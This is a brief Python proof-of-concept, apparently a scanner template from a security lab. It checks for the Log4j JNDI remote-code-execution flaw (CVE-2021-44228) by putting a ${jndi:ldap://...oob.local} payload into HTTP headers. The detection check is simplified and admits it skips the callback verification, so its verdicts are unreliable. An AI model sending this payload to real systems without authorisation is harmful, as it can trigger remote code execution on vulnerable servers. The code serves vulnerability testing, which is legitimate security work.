"""
示例PoC: Log4j RCE漏洞检测
"""

import requests
import random
import string

CVE = "CVE-2021-44228"
PRODUCT = "Apache Log4j"
VERSION_RANGE = ">=2.0,<2.15.0"
RISK_LEVEL = "严重"
DESCRIPTION = "Apache Log4j JNDI RCE漏洞"
AUTHOR = "昆仑安全实验室"
TAGS = ["rce", "jndi", "log4j"]
REFERENCES = ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"]


def generate_random_subdomain():
    """生成随机子域名"""
    return ''.join(random.choices(string.ascii_lowercase, k=10))


def verify(target: str) -> tuple:
    """
    验证Log4j漏洞
    返回: (是否存在漏洞, 证据)
    """
    try:
        # 生成唯一的DNSLog子域名
        subdomain = generate_random_subdomain()
        dnslog_url = f"${{jndi:ldap://{subdomain}.oob.local/exp}}"
        
        # 发送带有恶意payload的请求
        headers = {
            "User-Agent": dnslog_url,
            "X-Api-Version": dnslog_url,
            "Referer": dnslog_url,
        }
        
        response = requests.get(
            target,
            headers=headers,
            timeout=10,
            verify=False
        )
        
        # 检查响应中是否有漏洞迹象
        if response.status_code == 500 or "jndi" in response.text.lower():
            return (True, f"目标 {target} 可能存在Log4j漏洞，状态码: {response.status_code}")
        
        # 实际应用中应该检查DNSLog是否收到请求
        # 这里简化处理
        return (False, f"目标 {target} 未检测到Log4j漏洞")
        
    except requests.exceptions.RequestException as e:
        return (False, f"请求失败: {str(e)}")
    except Exception as e:
        return (False, f"验证失败: {str(e)}")
